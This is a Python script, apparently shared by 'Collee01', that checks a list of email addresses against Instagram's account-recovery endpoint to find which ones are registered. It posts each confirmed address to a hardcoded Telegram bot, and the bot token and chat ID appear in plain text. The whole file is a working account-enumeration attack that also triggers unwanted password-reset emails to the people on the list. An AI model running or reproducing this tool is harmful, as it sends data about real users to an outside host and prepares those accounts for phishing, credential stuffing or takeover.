import requests

# إعدادات بوت تيليجرام
BOT_TOKEN = "8076653428:AAHTMQ7jFBoscWqV9qy5BtgWi7anITcqOSY"
CHAT_ID = "7957784778"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code != 200:
            print(f"Failed to send message: {response.text}")
    except Exception as e:
        print(f"Error sending message: {e}")

class CheckInstagram:

    def __init__(self, email):
        self.email = email.strip()
        self.instagram()

    def PrintT(self):
        print(f"{self.email} = Linked\n")
        send_telegram_message(f"✅ <b>Linked Instagram account found:</b>\n{self.email}")

    def PrintF(self):
        print(f"{self.email} = Unlinked\n")

    def instagram(self):
        print("==================")
        print("[+] Instagram [+]\n")
        r = requests.Session()
        url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36"
        headers = {
            'user-agent': user_agent,
            'X-CSRFToken': "missing"
        }
        r.headers.update(headers)
        data = {"email_or_username": self.email}
        try:
            req = r.post(url, data=data)
            text = req.text.lower()
            print(text + "\n")
            # تحقق من وجود مؤشرات على أن الإيميل مرتبط بحساب
            if ("we sent an" in text) or ("password" in text) or ("sent" in text):
                self.PrintT()
            else:
                self.PrintF()
        except Exception as e:
            print(f"Error checking Instagram for {self.email}: {e}")
            self.PrintF()

if __name__ == "__main__":
    print("""
        ~ Hi Sp is here
        Pub By Collee01
    """)
    try:
        with open("masa.txt", "r") as file:
            emails = file.readlines()
    except FileNotFoundError:
        print("File masa.txt not found!")
        exit()

    for email in emails:
        email = email.strip()
        if email:
            CheckInstagram(email)

    print('')    
    print('Press enter to exit.')
    input('')
